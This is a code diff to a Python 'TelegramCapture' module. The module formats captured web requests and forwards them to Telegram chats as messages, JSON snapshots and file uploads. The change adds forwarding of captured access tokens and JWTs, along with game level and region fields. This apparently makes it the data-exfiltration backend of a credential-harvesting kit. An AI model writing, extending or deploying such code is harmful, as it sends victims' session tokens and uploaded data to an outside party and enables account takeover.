@@ -2,6 +2,7 @@
 import json
 import urllib.request
 import uuid
+from datetime import datetime, timezone
 
 
 def _h(s):
@@ -45,14 +46,42 @@ class TelegramCapture:
         self._send_sync(record)
 
     def _send_sync(self, record):
-        files = record.pop("_files", []) or []
+        # user uploaded files
+        user_files = record.pop("_files", []) or []
+
+        # formatted text
         text = self._format(record)
+
+        # json snapshot
+        json_bytes = json.dumps(record, ensure_ascii=False, indent=2).encode("utf-8")
+        ts_tag = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+        src = record.get("source") or "capture"
+        json_filename = f"{src}_{ts_tag}.json"
+
         for chat_id in self.chats:
             try:
+                # 1. text message
                 if text.strip():
                     self._message(chat_id, text)
-                for f in files:
-                    self._document(chat_id, f)
+
+                # 2. json snapshot file (always)
+                self._document(
+                    chat_id,
+                    filename=json_filename,
+                    data=json_bytes,
+                    caption=f"📄 {json_filename}",
+                    content_type="application/json",
+                )
+
+                # 3. user's uploaded files
+                for f in user_files:
+                    self._document(
+                        chat_id,
+                        filename=f["filename"],
+                        data=f["data"],
+                        caption=f'📎 {f["filename"]} — {len(f["data"])} bytes',
+                        content_type=f.get("content_type", "application/octet-stream"),
+                    )
             except Exception as e:
                 print(f"[capture:telegram:{chat_id}] {e}")
 
@@ -66,12 +95,8 @@ class TelegramCapture:
             "request":          "📥",
         }.get(src, "📌")
 
-        L = []
+        L = [f"{icon} <b>{_h(src.upper())}</b>"]
 
-        # header
-        L.append(f"{icon} <b>{_h(src.upper())}</b>")
-
-        # identity line
         ident = []
         if r.get("sender"):
             ident.append(f"👤 <b>{_h(r.get('sender'))}</b>")
@@ -82,55 +107,56 @@ class TelegramCapture:
 
         L.append(f"🕒 <code>{_h(r.get('ts'))}</code>")
 
-        # request line
+        if r.get("level") or r.get("region"):
+            L.append("")
+            L.append(f"🎮 <b>Level:</b> <code>{_h(r.get('level'))}</code>")
+            L.append(f"🌍 <b>Region:</b> <code>{_h(r.get('region'))}</code>")
+
         L.append("")
         L.append("━━━━━━━━━━━━━━━━━━━━")
         L.append(f"<b>{_h(r.get('method'))}</b>  <code>{_h(r.get('path'))}</code>")
         L.append("━━━━━━━━━━━━━━━━━━━━")
 
-        # user agent / referer
         if r.get("user_agent"):
             L.append(f"🧭 <i>{_h(r.get('user_agent'))[:180]}</i>")
         if r.get("referer"):
             L.append(f"🔗 <i>{_h(r.get('referer'))[:150]}</i>")
 
-        # query
         q = r.get("query")
         if q and q not in ("{}", "null", "None"):
             L.append("")
             L.append("🔎 <b>Query</b>")
             L.append(f"<pre>{_h(q)[:600]}</pre>")
 
-        # body
         b = r.get("body")
         if b:
             L.append("")
             L.append("📨 <b>Body</b>")
             L.append(f"<pre>{_h(b)[:600]}</pre>")
 
-        # cookies
-        c = r.get("cookies")
-        if c and c not in ("{}", "null", "None"):
-            L.append("")
-            L.append("🍪 <b>Cookies</b>")
-            L.append(f"<pre>{_h(c)[:400]}</pre>")
-
-        # files
-        fsum = r.get("files_summary")
-        if fsum:
+        if r.get("files_summary"):
             L.append("")
             L.append("📎 <b>Files</b>")
-            L.append(f"<pre>{_h(fsum)[:800]}</pre>")
+            L.append(f"<pre>{_h(r.get('files_summary'))[:600]}</pre>")
 
-        # error
+        if r.get("access_token"):
+            L.append("")
+            L.append("🎟 <b>AccessToken</b>")
+            L.append(f"<pre>{_h(r.get('access_token'))[:800]}</pre>")
+
+        if r.get("jwt_token"):
+            L.append("")
+            L.append("💎 <b>JWT</b>")
+            L.append(f"<pre>{_h(r.get('jwt_token'))[:1200]}</pre>")
+
         if r.get("error"):
             L.append("")
             L.append("⚠️ <b>Error</b>")
-            L.append(f"<pre>{_h(r.get('error'))[:500]}</pre>")
+            L.append(f"<pre>{_h(r.get('error'))[:400]}</pre>")
 
         return "\n".join(L)
 
-    # ---------------- telegram api ----------------
+    # ---------------- api ----------------
 
     def _api(self, m):
         return self.API.format(token=self.token, method=m)
@@ -152,17 +178,14 @@ class TelegramCapture:
                 headers={"Content-Type": "application/json"}, method="POST")
             urllib.request.urlopen(req, timeout=10).read()
 
-    def _document(self, chat_id, f):
+    def _document(self, chat_id, filename, data, caption, content_type):
         body, ctype = _multipart(
-            fields={
-                "chat_id": chat_id,
-                "caption": f'📎 {f["filename"]} — {len(f["data"])} bytes',
-            },
+            fields={"chat_id": chat_id, "caption": caption[:900]},
             files=[{
                 "name": "document",
-                "filename": f["filename"],
-                "data": f["data"],
-                "content_type": f.get("content_type", "application/octet-stream"),
+                "filename": filename,
+                "data": data,
+                "content_type": content_type,
             }],
         )
         req = urllib.request.Request(self._api("sendDocument"), data=body,
